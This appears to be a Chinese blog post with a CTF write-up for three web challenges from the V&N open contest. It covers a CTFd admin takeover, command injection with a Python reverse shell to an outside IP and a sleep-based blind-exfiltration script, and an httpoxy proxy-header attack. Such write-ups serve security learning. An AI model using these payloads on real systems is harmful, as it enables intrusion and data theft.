<!DOCTYPE html>
<html lang="zh-CN">










<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content="">
    <meta name="author" content="chuddy">
    <meta name="keywords" content="">
    <title>v&amp;n公开赛部分web writeup ~ chuddy&#39;s Blog</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
    
        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
    
</head>

<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
<div class="container">
    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto text-center">
            
            <li class="nav-item">
                <a class="nav-link" href="/">Home</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/archives/">Archives</a>
            </li>
            
        </ul>
    </div>
</div>


</nav>
    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
    <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
        <div class="container text-center white-text wow fadeInUp">
            <p class="h2">v&n公开赛部分web writeup</p>
            <br>
            
            <p>Saturday, February 29th 2020, 7:45 pm</p>
            
        </div>
        </div>
    </div>
    </div>
  </header>

  <main>
  
  <div class="container-fluid">
    <div class="row">
        <div class="col-md-8 offset-md-2 ">
            <div class="post-content py-5 z-depth-3 main">
                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这周buu平台举办了v&amp;n公开赛，学到了好多东西， 简单记录一下</p>
<a id="more"></a>
<h1 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h1><p>打开题目，发现是一个CTFd，上网搜了一下：<a href="https://www.colabug.com/2020/0204/6940556/amp/" target="_blank" rel="noopener">参考链接</a></p>
<p>大致思路：<br>先注册一个 admin空格 的账号，邮箱填上buu内网的邮箱。以 admin空格 账户登陆。然后修改密码，给我们注册的邮箱发送邮件，去内网邮箱处登陆，点击链接修改密码。这样平台真正的admin账户就被修改了。</p>
<p>我们以用户名admin,密码为我们刚刚修改的登陆。找到flag.<br><img src="https://s2.ax1x.com/2020/03/01/32ZMzn.png" alt="32ZMzn.png"></p>
<p>下载这个txt文件，里面就是flag。</p>
<h1 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h1><p>打开题目，发现给出了源码：</p>
<pre><code>from flask import Flask, request
import os
app = Flask(__name__)

flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)
# flag = flag_file.read()
# flag_file.close()
#
# @app.route(&#39;/flag&#39;)
# def flag():
#     return flag
## want flag? naive!

# You will never find the thing you want:) I think
@app.route(&#39;/shell&#39;)
def shell():
    os.system(&quot;rm -f flag.txt&quot;)
    exec_cmd = request.args.get(&#39;c&#39;)
    os.system(exec_cmd)
    return &quot;1&quot;

@app.route(&#39;/&#39;)
def source():
    return open(&quot;app.py&quot;,&quot;r&quot;).read()

if __name__ == &quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;)

</code></pre><p>这里有一个无回显的shell:</p>
<pre><code>@app.route(&#39;/shell&#39;)
def shell():
    os.system(&quot;rm -f flag.txt&quot;)
    exec_cmd = request.args.get(&#39;c&#39;)
    os.system(exec_cmd)
    return &quot;1&quot;
</code></pre><p>我们可以进行反弹shell因为这里师python的环境，就用python反弹shell.<br>首先开一台buu内部的服务器。<br>查ip，监听端口<code>nc -lvvp 8888</code><br>然后反弹shell:</p>
<pre><code>http://adeb7b0e-c8d1-4cb2-bfa3-58d5a36941d4.node3.buuoj.cn/shell?c=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22174.0.221.113%22%2C8888))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call([%22%2fbin%2fbash%22%2C%22-i%22])%3B%27
</code></pre><p>我们发现这里先打开了<code>flag</code>文件，<code>flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)</code><br>然后在每次执行命令前删除flag文件了。<code>os.system(&quot;rm -f flag.txt&quot;)</code></p>
<p>查阅文章发现：<a href="https://www.hi-linux.com/posts/64295.html#procpidfd" target="_blank" rel="noopener">参考链接</a></p>
<p><code>/proc/[pid]/fd</code> 是一个目录，在 linux 系统中如果一个程序打开了一个文件没有关闭，包含进程打开文件的情况。在相应进程的<code>/proc/$pid/fd</code> 目录下存放了此进程所有打开的<code>fd</code>，通过这个我们即可得到被删除文件的内容。</p>
<p>payload:<code>cat /proc/*/fd/*</code></p>
<p><img src="https://s2.ax1x.com/2020/03/01/32AUJA.png" alt="32AUJA.png"></p>
<p><strong>另一种思路</strong></p>
<p>看到了一个大佬用另一种方法来解题，是利用linux，命令sleep，相当于SQL中的时间盲注记录一下：<a href="https://blog.csdn.net/a3320315/article/details/104590534/" target="_blank" rel="noopener">大佬的思路</a></p>
<p>脚本：</p>
<pre><code>#encoding:utf-8

import requests,time
import sys
import urllib


reload(sys)
sys.setdefaultencoding(&quot;utf8&quot;)

url=&#39;http://f057b28d-b587-4f52-8527-e6f2fd40a908.node3.buuoj.cn/shell?c=&#39;
letter=&quot;abcdeflg{}0123456789-&quot;
def find_file():                #找到flag的位置
    for i in range(255):
        for n in range(30): 
            file=&#39;/proc/{0}/fd/{1}&#39;
            file = file.format(i,n)
            for m in range(1,5):
                payload = r&quot;sleep $(cat {0}|awk &#39;NR=={1}&#39;|sed &#39;s/.*\(flag{{.*}}\).*/\1/g&#39;|cut -c1|tr f 3)&quot;.format(file, m)
                t1=time.time()
                req = requests.get(url+urllib.quote(payload))
                t2=time.time()
                while (req.status_code != 200):
                    t1=time.time()
                    req = requests.get(url+urllib.quote(payload))
                    t2=time.time()
                print payload
                if t2-t1&gt;=2.5:
                    print file


def if_number():        #找出flag中哪几个是数字，哪些是0,如果是0，应该sleep时间大于9，但是flag中也含有9，所以输出为0时，应验证原数字是否为9
    number = []
    for i in range(1,50):
            #time.sleep(0.6)
            payload = r&quot;sleep $(cat /proc/11/fd/3 |sed &#39;s/.*\(flag{{.*}}\).*/\1/g&#39;|cut -c{0}|tr 0 9)&quot;.format(i)
            t1=time.time()
            req = requests.get(url+urllib.quote(payload))
            t2=time.time()
            while (req.status_code!=200):
                t1=time.time()
                req = requests.get(url+urllib.quote(payload))
                t2=time.time()
            print payload
            if t2-t1&gt;9:
                number.append(&#39;0*****&#39;+str(i))              #假如休眠九秒，可能是0替换成9，也可能是真的9
                print number
            elif t2-t1&gt;=1:
                number.append(i)
                print number


def get_flag():             #时间盲注flag
    number =  [6, 7, 8, 10, 11, 12, 15, 16, 20, 22, 26, 27, 28, 31, 32, 34, 35, 39, 40, 41]
    flag = &#39;&#39;
    for i in range(1,50):
        if i in number:
            flag += &#39;x&#39;             #数字用x代替
            continue
        for n in letter:
            #time.sleep(0.6)
            payload = r&quot;sleep $(cat /proc/11/fd/3 |sed &#39;s/.*\(flag{{.*}}\).*/\1/g&#39;|cut -c{0}|tr {1} 4)&quot;.format(i,n)
            t1=time.time()
            req = requests.get(url+urllib.quote(payload))
            t2=time.time()
            while (req.status_code!=200):
                            t1=time.time()
                            req = requests.get(url+urllib.quote(payload))
                            t2=time.time()
            print payload
            if t2-t1&gt;=3.5 :
                flag += n
                print flag
                break
get_flag()
#sleep $(cat /proc/6/fd/2|awk &#39;NR==1&#39;|sed &#39;s/.*\(flag{.*}\).*/\1/g&#39;|cut -c1|tr f 3)
#flag{912f020-48ca-4a0b-b927-a76a45fab649}

</code></pre><h1 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h1><p>打开题目，发现又源码：</p>
<pre><code> &lt;?php
error_reporting(0);
require __DIR__ . &#39;/vendor/autoload.php&#39;;

use GuzzleHttp\Client;

highlight_file(__FILE__);

if(isset($_GET[&#39;flag&#39;])) {
    $client = new Client();
    $response = $client-&gt;get(&#39;http://127.0.0.1:5000/api/eligible&#39;);
    $content = $response-&gt;getBody();
    $data = json_decode($content, TRUE);
    if($data[&#39;success&#39;] === true) {
      echo system(&#39;/readflag&#39;);
    }
}

if(isset($_GET[&#39;file&#39;])) {
    highlight_file($_GET[&#39;file&#39;]);
}

if(isset($_GET[&#39;phpinfo&#39;])) {
    phpinfo();
}

</code></pre><ul>
<li>传入 flag，会请求一个 HTTPAPI 服务，那个服务返回 success 的话就执行程序读 flag。</li>
<li>传入 file，就回去读这个文件。</li>
<li>传入 phpinfo，就会执行 phpinfo。</li>
</ul>
<p>传入<code>phpinfo</code>发现：<br><img src="https://s2.ax1x.com/2020/03/01/32MlQJ.png" alt="32MlQJ.png"><br>发现是以 cgi 方式运行的，那么我们就可以根据 <a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">参考链接</a> ，来传入一个 Proxy头，使其产生一个 HTTP_PROXY 环境变量，这个环境变量再被程序里的 GuzzleHttp 使用，即可使流量走代理，控制返回的请求。</p>
<p>开一台buu内部的服务器。在服务器上将下面内容保存为1.txt，</p>
<pre><code>HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sat, 29 Feb 2020 05:27:31 GMT
Content-Type: text/html; charset=UTF-8
Connection: Keep-alive
Content-Length: 16

{&quot;success&quot;:true}
</code></pre><p>然后执行<code>nc -lvvp 8888 &lt; 1.txt</code></p>
<p>使用bp抓包，传入一个 Proxy头内容为<code>Proxy:http://服务器ip:监听端口</code><br><img src="https://s2.ax1x.com/2020/03/01/32Kwbq.png" alt="32Kwbq.png"></p>

                <hr>
                <div>
                    <p>
                         
                        <span class="badge badge-light">#&nbsp;writeup</span>
                        &nbsp;
                        
                    </p>
                </div>
                <br>
                
            </div>
        </div>
        <div class="d-none d-md-block col-md-2">
            
  <div id="toc" class="py-5">
    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
    <div id="tocbot"></div>
  </div>

        </div>
    </div>        
</div>

<br><br><br>

<!-- Comments -->
<div class="comments" id="comments">
 
</div>
  
  </main>

<footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
  </div>
</footer>

  <!-- SCRIPTS -->
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
  <script src="/js/main.js"></script>
  
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    
    <script src="/js/post.js"></script>
    
      <script src="/js/plugins/prettify.js"></script>
      <script>
          $(document).ready(function(){
              $('pre').addClass('prettyprint linenums');
              prettyPrint();
          })
      </script>
    
  
</body>
</html>